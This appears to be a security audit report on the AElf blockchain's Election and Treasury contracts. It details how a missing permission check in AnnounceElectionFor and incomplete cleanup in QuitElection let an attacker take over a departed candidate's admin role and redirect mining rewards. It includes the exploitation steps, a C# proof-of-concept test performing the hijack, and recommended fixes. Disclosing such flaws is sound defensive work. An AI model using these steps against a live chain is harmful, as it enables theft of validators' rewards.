# Audit Report

## Title
Admin Hijacking via AnnounceElectionFor Enables ProfitsReceiver Redirect After Candidate Quits

## Summary
The `QuitElection` method fails to clear the `CandidateAdmins` mapping, and `AnnounceElectionFor` lacks permission checks, allowing any attacker to hijack a quit candidate's admin role by re-announcing with an attacker-controlled admin address. This enables redirection of all future mining rewards and backup subsidies to the attacker through `SetProfitsReceiver`.

## Finding Description

**Root Cause Analysis:**

When a candidate quits election, the `QuitElection` method only sets `IsCurrentCandidate = false` but does not clear the `CandidateAdmins` mapping. [1](#0-0) 

The `AnnounceElectionFor` method is a public RPC with no permission checks that allows anyone to announce election for any pubkey. [2](#0-1) 

The internal `AnnounceElection` helper only validates that `!candidateInformation.IsCurrentCandidate`, which passes for quit candidates. [3](#0-2) 

After passing this check, `AnnounceElectionFor` unconditionally overwrites the admin mapping. [4](#0-3) 

**Exploitation Sequence:**

1. Legitimate candidate Alice quits election via `QuitElection`, leaving `CandidateAdmins[Alice_pubkey]` unchanged
2. Attacker calls `AnnounceElectionFor(Alice_pubkey, Attacker_Admin)` 
3. The `!candidateInformation.IsCurrentCandidate` check passes since Alice quit
4. `CandidateAdmins[Alice_pubkey]` is overwritten with `Attacker_Admin`
5. Attacker calls `SetProfitsReceiver` which authorizes via `GetCandidateAdmin` [5](#0-4) 
6. `ProfitsReceiverMap[Alice_pubkey]` is set to attacker's address [6](#0-5) 

**Why Protections Fail:**

The `SetCandidateAdmin` recovery method requires the sender to be either Parliament or the current admin. After hijacking, the attacker IS the current admin. [7](#0-6) 

**Reward Redirection:**

Mining rewards are distributed using `GetProfitsReceiver(i.Pubkey)` which reads from the hijacked `ProfitsReceiverMap`. [8](#0-7) 

The underlying `GetProfitsReceiver` implementation returns the hijacked mapping value. [9](#0-8) 

Backup subsidies use `GetBeneficiaryAddress` which calls `GetProfitsReceiverOrDefault`, also reading the hijacked mapping. [10](#0-9) 

The Election contract's `GetProfitsReceiverOrDefault` queries the Treasury contract's `ProfitsReceiverMap`. [11](#0-10) 

## Impact Explanation

**Direct Financial Loss:**
- All miner rewards (BasicRewardHash scheme) for the hijacked pubkey are redirected to the attacker
- All backup candidate subsidies (SubsidyHash scheme) are redirected to the attacker  
- If the hijacked pubkey later becomes a top miner, this represents substantial value theft over time

**Authorization Violation:**
- The candidate's admin role is permanently hijacked without their consent
- Original candidate loses all control over their pubkey's profit receiver settings
- Recovery requires Parliament governance intervention, creating operational burden

**Affected Parties:**
- Any candidate who quits election (common during term transitions, regulatory compliance, planned maintenance)
- Former miners who temporarily withdraw but may rejoin
- Backup candidates in data centers who cycle in/out

This represents a critical breach of the protocol's economic security model, enabling direct theft of reward distributions through unauthorized admin takeover and profit receiver manipulation.

## Likelihood Explanation

**Attacker Profile:**
- Requires only 100,000 tokens for `LockTokenForElection` (refundable by quitting later) [12](#0-11) 
- No special privileges needed - `AnnounceElectionFor` is a public RPC [13](#0-12) 
- Can monitor on-chain events to identify quit candidates

**Attack Complexity:**
- Two simple transactions: (1) `AnnounceElectionFor`, (2) `SetProfitsReceiver`
- Fully deterministic with no race conditions
- No timing constraints beyond acting before original candidate (if ever)

**Preconditions:**
- Target must have quit election (routine occurrence in validator operations)
- Attack window is indefinite - vulnerability persists until hijacked or original candidate re-announces
- Multiple vulnerable targets likely exist at any given time

**Economic Incentive:**
- Cost: 100,000 tokens locked (recoverable)
- Potential gain: Proportional share of Treasury distributions (BasicRewardHash + SubsidyHash)
- For top miners, this could exceed millions in cumulative rewards
- Extremely favorable risk/reward ratio

**Detection Difficulty:**
- No on-chain alerts for admin changes
- Victim may not notice until attempting to reclaim control or checking distributions
- Rewards accumulate silently to attacker's address

The combination of low barrier to entry, high economic incentive, indefinite attack window, and multiple potential targets makes exploitation highly probable.

## Recommendation

**Immediate Fix:**

1. **Clear Admin on Quit**: Modify `QuitElection` to explicitly clear the candidate admin mapping:
   ```csharp
   State.CandidateAdmins.Remove(pubkey);
   ```

2. **Add Permission Check to AnnounceElectionFor**: Require that either:
   - The sender is the candidate whose pubkey is being announced (verified via signature recovery), OR
   - The sender is the existing admin if one is already set (for legitimate sponsorship scenarios), OR  
   - Require explicit approval from the target pubkey's address

3. **Prevent Re-announcement Without Cleanup**: Add check in `AnnounceElection` helper:
   ```csharp
   if (candidateInformation != null && !candidateInformation.IsCurrentCandidate) {
       Assert(State.CandidateAdmins[pubkey] == null, "Must clear admin before re-announcing");
   }
   ```

**Defense in Depth:**

- Emit events when `CandidateAdmins` mapping is modified for monitoring
- Consider requiring a grace period or additional authorization for `SetProfitsReceiver` changes
- Document the sponsorship model clearly to distinguish legitimate vs hijacking scenarios

## Proof of Concept

```csharp
[Fact]
public async Task AdminHijackingVulnerability_Test()
{
    // Setup: Alice announces as candidate with Admin_A
    var aliceKeyPair = ValidationDataCenterKeyPairs[0];
    var alicePubkey = aliceKeyPair.PublicKey.ToHex();
    var adminA = Accounts[10].Address;
    
    await ElectionContractStub.AnnounceElection.SendAsync(adminA);
    
    // Verify Admin_A is set
    var retrievedAdmin = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = alicePubkey });
    retrievedAdmin.ShouldBe(adminA);
    
    // Alice quits election
    var adminAStub = GetElectionContractTester(Accounts[10].KeyPair);
    await adminAStub.QuitElection.SendAsync(new StringValue { Value = alicePubkey });
    
    // Verify IsCurrentCandidate is false
    var candidateInfo = await ElectionContractStub.GetCandidateInformation.CallAsync(
        new StringValue { Value = alicePubkey });
    candidateInfo.IsCurrentCandidate.ShouldBe(false);
    
    // ATTACK: Bob hijacks admin by calling AnnounceElectionFor
    var attackerBob = Accounts[11];
    var adminB = Accounts[12].Address; // Attacker-controlled admin
    var bobElectionStub = GetElectionContractTester(attackerBob.KeyPair);
    
    // Bob must first prepare tokens for lock
    await TokenContractStub.Transfer.SendAsync(new TransferInput
    {
        To = attackerBob.Address,
        Symbol = "ELF",
        Amount = 100_000_00000000
    });
    
    var bobTokenStub = GetTokenContractTester(attackerBob.KeyPair);
    await bobTokenStub.Approve.SendAsync(new ApproveInput
    {
        Spender = ElectionContractAddress,
        Symbol = "ELF",
        Amount = 100_000_00000000
    });
    
    // Execute hijacking
    await bobElectionStub.AnnounceElectionFor.SendAsync(new AnnounceElectionForInput
    {
        Pubkey = alicePubkey,
        Admin = adminB
    });
    
    // VERIFY: Admin is now hijacked
    var hijackedAdmin = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = alicePubkey });
    hijackedAdmin.ShouldBe(adminB); // Admin changed from Admin_A to Admin_B!
    
    // ATTACK CONTINUATION: Set profits receiver to attacker's address
    var adminBStub = GetElectionContractTester(Accounts[12].KeyPair);
    var attackerAddress = Accounts[13].Address;
    
    var treasuryStub = GetTreasuryContractTester(Accounts[12].KeyPair);
    await treasuryStub.SetProfitsReceiver.SendAsync(new SetProfitsReceiverInput
    {
        Pubkey = alicePubkey,
        ProfitsReceiverAddress = attackerAddress
    });
    
    // VERIFY: Profits receiver hijacked
    var profitsReceiver = await TreasuryContractStub.GetProfitsReceiver.CallAsync(
        new StringValue { Value = alicePubkey });
    profitsReceiver.ShouldBe(attackerAddress); // All rewards will go to attacker!
    
    // VERIFY: Original admin (Admin_A) cannot recover control
    var result = await adminAStub.SetCandidateAdmin.SendWithExceptionAsync(new SetCandidateAdminInput
    {
        Pubkey = alicePubkey,
        Admin = adminA
    });
    result.TransactionResult.Error.ShouldContain("No permission");
}
```

**Notes:**

This vulnerability represents a critical flaw in the Election contract's authorization model. The combination of missing permission checks in `AnnounceElectionFor` and incomplete state cleanup in `QuitElection` creates a persistent attack vector against any candidate who quits election. The economic incentives strongly favor exploitation, as attackers can redirect substantial reward distributions with minimal upfront cost (100k tokens, recoverable) and no technical barriers. The indefinite attack window and permanent nature of the hijacking (requiring Parliament intervention to recover) make this a high-severity issue requiring immediate remediation.

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L27-40)
```csharp
        if (Context.Sender != GetParliamentDefaultAddress())
        {
            if (State.CandidateAdmins[pubkey] == null)
            {
                // If admin is not set before (due to old contract code)
                Assert(Context.Sender == Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(input.Pubkey)),
                    "No permission.");
            }
            else
            {
                var oldCandidateAdmin = State.CandidateAdmins[pubkey];
                Assert(Context.Sender == oldCandidateAdmin, "No permission.");
            }
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L121-142)
```csharp
    public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
    {
        var pubkey = input.Pubkey;
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
        var address = Address.FromPublicKey(pubkeyBytes);
        AnnounceElection(pubkeyBytes);
        var admin = input.Admin ?? Context.Sender;
        State.CandidateAdmins[pubkey] = admin;
        var managedPubkeys = State.ManagedCandidatePubkeysMap[admin] ?? new PubkeyList();
        managedPubkeys.Value.Add(ByteString.CopyFrom(pubkeyBytes));
        State.ManagedCandidatePubkeysMap[admin] = managedPubkeys;
        LockCandidateNativeToken();
        AddCandidateAsOption(pubkey);
        if (State.Candidates.Value.Value.Count <= GetValidationDataCenterCount())
        {
            State.DataCentersRankingList.Value.DataCenters.Add(pubkey, 0);
            RegisterCandidateToSubsidyProfitScheme(pubkey);
        }

        State.CandidateSponsorMap[input.Pubkey] = Context.Sender;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L156-157)
```csharp
            Assert(!candidateInformation.IsCurrentCandidate,
                $"This public key already announced election. {pubkey}");
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L177-195)
```csharp
    private void LockCandidateNativeToken()
    {
        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        // Lock the token from sender for deposit of announce election
        var lockId = Context.OriginTransactionId;
        var lockVirtualAddress = Context.ConvertVirtualAddressToContractAddress(lockId);
        var sponsorAddress = Context.Sender;
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = sponsorAddress,
            To = lockVirtualAddress,
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Lock for announcing election."
        });
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L252-254)
```csharp
        candidateInformation.IsCurrentCandidate = false;
        candidateInformation.AnnouncementTransactionId = Hash.Empty;
        State.CandidateInformationMap[pubkey] = candidateInformation;
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L608-609)
```csharp
        var admin = State.ElectionContract.GetCandidateAdmin.Call(new StringValue {Value = input.Pubkey});
        Assert(Context.Sender == admin , "No permission.");
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L620-620)
```csharp
        State.ProfitsReceiverMap[input.Pubkey] = input.ProfitsReceiverAddress;
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L651-655)
```csharp
    private Address GetProfitsReceiver(string pubkey)
    {
        return State.ProfitsReceiverMap[pubkey] ??
               Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(pubkey));
    }
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L816-816)
```csharp
                        Beneficiary = GetProfitsReceiver(i.Pubkey),
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L769-779)
```csharp
    private Address GetProfitsReceiverOrDefault(string pubkey)
    {
        if (State.TreasuryContract.Value == null)
            State.TreasuryContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TreasuryContractSystemName);
        var address = State.TreasuryContract.GetProfitsReceiverOrDefault.Call(new StringValue
        {
            Value = pubkey
        });
        return address;
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L809-816)
```csharp
    private Address GetBeneficiaryAddress(string candidatePubkey, Address profitsReceiver = null)
    {
        profitsReceiver = profitsReceiver == null ? GetProfitsReceiverOrDefault(candidatePubkey) : profitsReceiver;
        var beneficiaryAddress = profitsReceiver.Value.Any()
            ? profitsReceiver
            : Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(candidatePubkey));
        return beneficiaryAddress;
    }
```

**File:** protobuf/election_contract.proto (L38-38)
```text
    rpc AnnounceElectionFor (AnnounceElectionForInput) returns (google.protobuf.Empty) {
```
